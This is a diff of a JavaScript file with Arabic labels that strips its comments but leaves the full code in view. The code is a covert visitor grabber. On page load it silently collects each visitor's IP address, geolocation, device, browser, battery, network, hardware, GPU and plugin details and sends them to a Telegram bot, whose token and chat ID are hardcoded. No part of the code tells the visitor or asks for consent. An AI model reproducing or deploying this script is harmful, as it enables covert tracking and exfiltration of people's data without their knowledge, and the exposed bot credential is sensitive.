@@ -1,4 +1,3 @@
-// دالة محسنة لجلب عنوان IP مع عدة بدائل
 async function getIPAddress() {
     const providers = [
         'https://api.ipify.org?format=json',
@@ -20,7 +19,6 @@ async function getIPAddress() {
     return 'غير معروف';
 }
 
-// دالة محسنة للحصول على الموقع الجغرافي
 async function getLocation(ip) {
     const providers = [
         `https://ipapi.co/${ip}/json/`,
@@ -54,7 +52,6 @@ async function getLocation(ip) {
     };
 }
 
-// دالة محسنة لكشف معلومات الجهاز
 function getDeviceInfo() {
     const ua = navigator.userAgent;
     const result = {
@@ -67,7 +64,6 @@ function getDeviceInfo() {
         architecture: 'غير معروف'
     };
 
-    // كشف نوع الجهاز
     if (/Mobi|Android/i.test(ua)) {
         result.deviceType = 'هاتف محمول';
     } else if (/Tablet|iPad/i.test(ua)) {
@@ -76,8 +72,7 @@ function getDeviceInfo() {
         result.deviceType = 'كمبيوتر';
     }
 
-    // كشف نظام التشغيل
-    if (/Android/i.test(ua)) {
+   if (/Android/i.test(ua)) {
         result.os = 'Android';
         const androidMatch = ua.match(/Android\s([0-9.]+)/);
         if (androidMatch) result.osVersion = androidMatch[1];
@@ -103,14 +98,12 @@ function getDeviceInfo() {
         result.os = 'Linux';
     }
 
-    // كشف المتصفح
     const browserMatch = ua.match(/(Firefox|Chrome|Safari|Opera|Edge|MSIE|Trident(?=\/))\/?\s*(\d+)/i) || [];
     if (browserMatch[1]) {
         result.browser = browserMatch[1].replace('Trident', 'IE');
         result.browserVersion = browserMatch[2] || 'غير معروف';
     }
 
-    // كشف بنية المعالج (إذا كان 64-bit أو 32-bit)
     if (/Win64|x64|WOW64/i.test(ua)) {
         result.architecture = '64-bit';
     } else if (/Win32|WOW32/i.test(ua)) {
@@ -120,7 +113,6 @@ function getDeviceInfo() {
     return result;
 }
 
-// دالة محسنة لجمع البيانات الإضافية
 async function getExtraInfo() {
     const result = {
         screenResolution: `${screen.width} × ${screen.height}`,
@@ -142,7 +134,6 @@ async function getExtraInfo() {
         plugins: []
     };
 
-    // معلومات البطارية
     if ('getBattery' in navigator) {
         try {
             const battery = await navigator.getBattery();
@@ -156,8 +147,7 @@ async function getExtraInfo() {
         }
     }
 
-    // معلومات الشبكة
-    if ('connection' in navigator) {
+   if ('connection' in navigator) {
         const conn = navigator.connection;
         result.connection = {
             type: conn.effectiveType || 'غير معروف',
@@ -167,7 +157,6 @@ async function getExtraInfo() {
         };
     }
 
-    // معلومات الأجهزة
     if ('deviceMemory' in navigator) {
         result.hardware.ram = `${navigator.deviceMemory} GB`;
     }
@@ -176,7 +165,6 @@ async function getExtraInfo() {
         result.hardware.cores = navigator.hardwareConcurrency;
     }
 
-    // كشف بطاقة الرسوميات
     try {
         const canvas = document.createElement('canvas');
         const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
@@ -190,7 +178,6 @@ async function getExtraInfo() {
         console.error('🎮 خطأ في كشف بطاقة الرسوميات:', e);
     }
 
-    // جمع معلومات الإضافات (Plugins)
     if (navigator.plugins && navigator.plugins.length > 0) {
         result.plugins = Array.from(navigator.plugins).map(plugin => ({
             name: plugin.name,
@@ -202,7 +189,6 @@ async function getExtraInfo() {
     return result;
 }
 
-// دالة محسنة لإرسال البيانات إلى Telegram
 async function sendToTelegram(data) {
     const botToken = '7561598438:AAH2QmWIslFXfDo_VWe96mvc6i3MAdoP6bo';
     const chatId = '5962064921';
@@ -268,12 +254,10 @@ async function sendToTelegram(data) {
     }
 }
 
-// الكود الرئيسي المحسن
 document.addEventListener('DOMContentLoaded', async function() {
     const startTime = new Date();
     
     try {
-        // جمع البيانات بشكل متوازي لتحسين الأداء
         const [ip, device, extra] = await Promise.all([
             getIPAddress(),
             getDeviceInfo(),
@@ -303,15 +287,12 @@ document.addEventListener('DOMContentLoaded', async function() {
         };
         
         console.log('📊 بيانات الزيارة المجمعة:', visitData);
-        
-        // إرسال البيانات إلى Telegram
-        const sendResult = await sendToTelegram(visitData);
+    const sendResult = await sendToTelegram(visitData);
         
 
         if (!sendResult) {
             console.warn('⚠️ لم يتم إرسال البيانات بنجاح، سيتم المحاولة لاحقاً');
-            // يمكن إضافة إعادة المحاولة هنا
-        }
+                }
     } catch (error) {
         console.error('🔥 حدث خطأ غير متوقع:', error);
     }
